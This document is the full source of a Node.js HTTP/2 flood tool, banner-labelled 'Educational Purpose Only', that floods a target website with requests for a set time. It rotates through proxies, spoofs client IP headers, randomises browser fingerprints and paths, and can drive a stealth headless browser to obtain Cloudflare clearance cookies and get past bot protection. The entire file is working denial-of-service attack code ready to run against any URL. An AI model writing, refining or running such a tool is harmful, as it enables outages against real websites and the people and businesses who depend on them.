#!/usr/bin/env node

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const fs = require('fs');
const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const url = require('url');
const cluster = require('cluster');
const crypto = require('crypto');
const readline = require('readline');

// ========== LOAD DATA FROM JSON ==========
let data = {};
try {
    data = JSON.parse(fs.readFileSync('data.json', 'utf8'));
    console.log('\x1b[32m[✓] Loaded data.json\x1b[0m');
} catch (err) {
    console.log('\x1b[31m[✗] Failed to load data.json\x1b[0m');
    process.exit(1);
}

const refers = data.referrers || [];
const uap = data.user_agents || [];
const cplist = data.cplist || [];
const sigalgsList = data.sigalgslist || [];

if (refers.length === 0) console.log('\x1b[33m[!] No referrers loaded\x1b[0m');
if (uap.length === 0) console.log('\x1b[33m[!] No user agents loaded\x1b[0m');
if (cplist.length === 0) console.log('\x1b[33m[!] No ciphers loaded\x1b[0m');

// ========== PUPPETEER CF BYPASS (OPTIONAL) ==========
let puppeteer = null;
let connect = null;
const ENABLE_CF_BYPASS = process.argv.includes('--cloudflare');

if (ENABLE_CF_BYPASS) {
    try {
        puppeteer = require('puppeteer-extra');
        const StealthPlugin = require('puppeteer-extra-plugin-stealth');
        puppeteer.use(StealthPlugin());
        connect = require('puppeteer-real-browser').connect;
        console.log('\x1b[36m[✓] Cloudflare bypass mode ENABLED\x1b[0m');
    } catch (e) {
        console.log('\x1b[31m[✗] --cloudflare requires: npm install puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-real-browser\x1b[0m');
        process.exit(1);
    }
}

// ========== HELP ==========
if (process.argv.length < 7) {
    console.log(`\n         ▒█░░░ ▀█▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ ▒█░░▒█ ▀█▀ ▒█▀▀█ ▒█▀▀▀ 
         ▒█░░░ ▒█░ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀ ░▒█▒█░ ▒█░ ▒█░░░ ▒█▀▀▀ 
         ▒█▄▄█ ▄█▄ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█ ░░▀▄▀░ ▄█▄ ▒█▄▄█ ▒█▄▄▄
               ULTIMATE HTTP/2 FLOOD + CF BYPASS (OPTIONAL)
                    Educational Purpose Only
                     Channel: @m85power
                      
Usage: node dali30_ultimate.js <target> <time> <rate> <threads> <proxyFile> [--path] [--cloudflare]

Parameters:
  target      - Target URL (https://example.com)
  time        - Duration in seconds
  rate        - Requests per second per thread
  threads     - Number of concurrent threads
  proxyFile   - File with proxy list (ip:port per line)
  --path      - Enable path randomization
  --cloudflare- Enable Cloudflare bypass (requires additional packages)

Example:
  node dali30_ultimate.js https://target.com 120 32 8 proxy.txt --path
  node dali30_ultimate.js https://target.com 120 32 8 proxy.txt --path --cloudflare
`);
    process.exit();
}

function readLines(filePath) {
    try {
        if (!fs.existsSync(filePath)) return [];
        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(l => l && l.trim() && !l.startsWith('#'));
    } catch { return []; }
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
    pathFlag: process.argv.includes('--path'),
    cfBypass: ENABLE_CF_BYPASS
};

if (!args.proxyFile || args.proxyFile === '') {
    console.log("\x1b[31m[✗] Proxy file required!\x1b[0m");
    process.exit(1);
}

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
if (!parsedTarget.host || parsedTarget.host === '') {
    console.log("\x1b[31m[✗] Invalid target URL!\x1b[0m");
    process.exit(1);
}
if (proxies.length === 0) {
    console.log("\x1b[33m[!] No proxies loaded. Running without proxy...\x1b[0m");
}

let reqSent = 0, reqSuccess = 0, reqError = 0;
let stat2xx = 0, stat3xx = 0, stat4xx = 0, stat5xx = 0;
let startTime = Date.now();
let proxyBlacklist = new Map();
const blacklistTTL = 30000;
let proxyIndex = 0;

function formatNumber(n) {
    if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M';
    if (n >= 1e3) return (n / 1e3).toFixed(1) + 'K';
    return n.toString();
}

function showStatus() {
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const rem = Math.max(0, args.time - elapsed);
    readline.cursorTo(process.stdout, 0);
    process.stdout.write(` t=${rem}s | ok=${formatNumber(reqSuccess)} | err=${formatNumber(reqError)} | 2:${stat2xx} 3:${stat3xx} 4:${stat4xx} 5:${stat5xx}`);
}

function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomString(length) { return crypto.randomBytes(length).toString('hex').slice(0, length); }
function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function ip_spoof() { return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,255)}`; }

function getChromeVersion(userAgent) {
    const match = userAgent.match(/Chrome\/([\d.]+)/);
    return match ? match[1] : "126";
}

const pathts = ["/", "/index.html", "/?a=1", "/?v=2", "/?r=3", "/?page=1", "/?page=2"];
const langHeaders = ["en-US,en;q=0.9", "id-ID,id;q=0.9,en;q=0.8", "vi-VN,vi;q=0.9,en;q=0.8"];

async function bypassCloudflareOnce(attemptNum) {
    if (!args.cfBypass) return null;
    console.log(`\x1b[33m[CF] Bypass attempt ${attemptNum}...\x1b[0m`);
    try {
        const response = await connect({
            headless: false,
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--window-size=1920,1080'],
            turnstile: true,
            connectOption: { defaultViewport: null }
        });
        const { browser, page } = response;
        await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 60000 });
        for (let i = 0; i < 60; i++) {
            await new Promise(r => setTimeout(r, 1000));
            const cookies = await page.cookies();
            if (cookies.find(c => c.name === "cf_clearance")) break;
        }
        const cookies = await page.cookies();
        const userAgent = await page.evaluate(() => navigator.userAgent);
        await browser.close();
        if (cookies.length > 0) {
            console.log(`\x1b[32m[CF] Success! Cookies: ${cookies.length}\x1b[0m`);
            return { cookies, userAgent, success: true };
        }
    } catch (error) {
        console.log(`\x1b[31m[CF] Failed: ${error.message}\x1b[0m`);
    }
    return null;
}

async function getCloudflareSessions(count) {
    if (!args.cfBypass) return [];
    console.log(`\x1b[36m[CF] Getting ${count} Cloudflare sessions...\x1b[0m`);
    const sessions = [];
    for (let i = 1; i <= count; i++) {
        const session = await bypassCloudflareOnce(i);
        if (session) sessions.push(session);
        await new Promise(r => setTimeout(r, 2000));
    }
    console.log(`\x1b[32m[CF] Obtained ${sessions.length} sessions\x1b[0m`);
    return sessions;
}

class NetSocket {
    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
        const connection = net.connect({ host: options.host, port: options.port });
        let timeoutId = setTimeout(() => {
            connection.destroy();
            callback(undefined, "timeout");
        }, options.timeout * 1000);
        connection.setKeepAlive(true, 100000);
        connection.on("connect", () => {
            clearTimeout(timeoutId);
            connection.write(payload);
        });
        connection.on("data", chunk => {
            if (chunk.toString().includes("HTTP/1.1 200")) {
                callback(connection, undefined);
            } else {
                connection.destroy();
                callback(undefined, "invalid proxy");
            }
        });
        connection.on("error", (err) => {
            clearTimeout(timeoutId);
            connection.destroy();
            callback(undefined, err.message);
        });
    }
}

function getNextProxy() {
    if (proxies.length === 0) return null;
    for (let i = 0; i < proxies.length; i++) {
        proxyIndex = (proxyIndex + 1) % proxies.length;
        const proxy = proxies[proxyIndex];
        if (!proxyBlacklist.has(proxy) || Date.now() > proxyBlacklist.get(proxy)) {
            proxyBlacklist.delete(proxy);
            return proxy;
        }
    }
    return proxies[0] || null;
}

function blacklistProxy(proxy) {
    proxyBlacklist.set(proxy, Date.now() + blacklistTTL);
}

function runWorker(workerId, cfSession) {
    const useProxy = proxies.length > 0;
    let proxyAddr = useProxy ? getNextProxy() : null;
    let parsedProxy = proxyAddr ? proxyAddr.split(":") : null;
    
    const cipper = cplist.length > 0 ? randomElement(cplist) : "ECDHE-RSA-AES128-GCM-SHA256";
    const fakeIP = ip_spoof();
    const basePath = parsedTarget.path || '/';
    const path = args.pathFlag ? randomElement(pathts) + "?" + randomString(8) + "=" + randomString(8) : basePath;
    const userAgent = (cfSession && cfSession.userAgent) ? cfSession.userAgent : (uap.length > 0 ? randomElement(uap) : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    const chromeVer = getChromeVersion(userAgent);
    
    const connectToTarget = (socket) => {
        const tlsConn = tls.connect(443, parsedTarget.host, {
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: cipper,
            servername: parsedTarget.host,
            socket: socket,
            honorCipherOrder: true,
            rejectUnauthorized: false,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
        });
        
        let clientConnected = false;
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: { headerTableSize: 65536, maxConcurrentStreams: 2000, initialWindowSize: 6291456, maxHeaderListSize: 262144, enablePush: false },
            createConnection: () => tlsConn,
        });
        
        const cookieHeader = (cfSession && cfSession.cookies && cfSession.cookies.length > 0) 
            ? cfSession.cookies.map(c => `${c.name}=${c.value}`).join('; ') 
            : null;
        
        const intervalMs = 100;
        const requestsPerInterval = Math.max(1, Math.floor(args.rate * intervalMs / 1000));
        
        const attackInterval = setInterval(() => {
            if (!clientConnected) return;
            for (let i = 0; i < requestsPerInterval; i++) {
                const headers = {
                    ':method': 'GET', ':path': path, ':scheme': 'https', ':authority': parsedTarget.host,
                    'user-agent': userAgent,
                    'accept': randomElement(['text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8']),
                    'accept-language': randomElement(langHeaders),
                    'accept-encoding': 'gzip, deflate, br',
                    'cache-control': randomElement(['no-cache', 'max-age=0', 'no-store']),
                    'upgrade-insecure-requests': '1',
                    'sec-ch-ua': `"Chromium";v="${chromeVer}", "Not)A;Brand";v="8", "Chrome";v="${chromeVer}"`,
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': randomElement(['Windows', 'macOS', 'Linux']),
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'cross-site',
                    'referer': (refers.length > 0 ? randomElement(refers) : "https://www.google.com/") + randomString(8),
                    'x-forwarded-for': fakeIP,
                    'client-ip': fakeIP,
                    'via': fakeIP,
                    'te': 'trailers'
                };
                if (cookieHeader) headers['cookie'] = cookieHeader;
                
                const request = client.request(headers);
                request.on('response', (resp) => {
                    const status = resp[':status'];
                    if (status >= 200 && status < 300) { stat2xx++; reqSuccess++; }
                    else if (status < 400) { stat3xx++; reqSuccess++; }
                    else if (status < 500) { stat4xx++; reqError++; }
                    else { stat5xx++; reqError++; }
                    request.close();
                });
                request.on('error', () => { reqError++; request.close(); });
                request.end();
                reqSent++;
            }
        }, intervalMs);
        
        client.on('connect', () => { clientConnected = true; });
        client.on('error', (err) => { 
            clearInterval(attackInterval); 
            if (socket) socket.destroy();
            client.destroy(); 
        });
        client.on('close', () => { clearInterval(attackInterval); });
        
        setTimeout(() => { 
            clearInterval(attackInterval); 
            client.close(); 
            if (socket) socket.destroy();
        }, args.time * 1000);
    };
    
    if (useProxy && parsedProxy && parsedProxy.length >= 2) {
        const Socker = new NetSocket();
        const proxyOptions = { host: parsedProxy[0], port: parseInt(parsedProxy[1]), address: parsedTarget.host + ":443", timeout: 25 };
        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error || !connection) { 
                if (proxyAddr) blacklistProxy(proxyAddr);
                setTimeout(() => runWorker(workerId, cfSession), 1000);
                return; 
            }
            connection.setKeepAlive(true, 100000);
            connectToTarget(connection);
        });
    } else {
        const directSocket = net.createConnection({ host: parsedTarget.host, port: 443 });
        directSocket.setKeepAlive(true, 100000);
        directSocket.on('error', () => {});
        connectToTarget(directSocket);
    }
}

if (cluster.isMaster) {
    console.clear();
    console.log(`\n         ▒█░░░ ▀█▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ ▒█░░▒█ ▀█▀ ▒█▀▀█ ▒█▀▀▀ 
         ▒█░░░ ▒█░ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀ ░▒█▒█░ ▒█░ ▒█░░░ ▒█▀▀▀ 
         ▒█▄▄█ ▄█▄ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█ ░░▀▄▀░ ▄█▄ ▒█▄▄█ ▒█▄▄▄
               ULTIMATE HTTP/2 FLOOD + CF BYPASS (OPTIONAL)
                    Educational Purpose Only
                     Channel: @m85power
    `);
    console.log(` Target       : ${args.target}`);
    console.log(` Duration     : ${args.time}s`);
    console.log(` Rate         : ${args.rate} req/sec/thread`);
    console.log(` Threads      : ${args.threads}`);
    console.log(` Proxies      : ${proxies.length}`);
    console.log(` Referrers    : ${refers.length}`);
    console.log(` User Agents  : ${uap.length}`);
    console.log(` Ciphers      : ${cplist.length}`);
    console.log(` Path Rand    : ${args.pathFlag ? 'ON' : 'OFF'}`);
    console.log(` CF Bypass    : ${args.cfBypass ? 'ON (Cloudflare mode)' : 'OFF (Normal mode)'}`);
    console.log(`\n Attack started - Press Ctrl+C to stop\n`);
    
    (async () => {
        let cfSessions = [];
        if (args.cfBypass) {
            cfSessions = await getCloudflareSessions(args.threads);
        }
        for (let i = 0; i < args.threads; i++) {
            const session = cfSessions[i % cfSessions.length] || null;
            const worker = cluster.fork();
            worker.send({ type: 'cfSession', data: session });
        }
        setInterval(showStatus, 1000);
        setTimeout(() => { 
            console.log(`\n\x1b[32m Attack finished\x1b[0m`); 
            process.exit(0); 
        }, args.time * 1000);
    })();
} else {
    let cfSession = null;
    process.on('message', (msg) => {
        if (msg && msg.type === 'cfSession') {
            cfSession = msg.data;
            runWorker(cluster.worker.id, cfSession);
        }
    });
    setTimeout(() => { process.exit(0); }, args.time * 1000);
}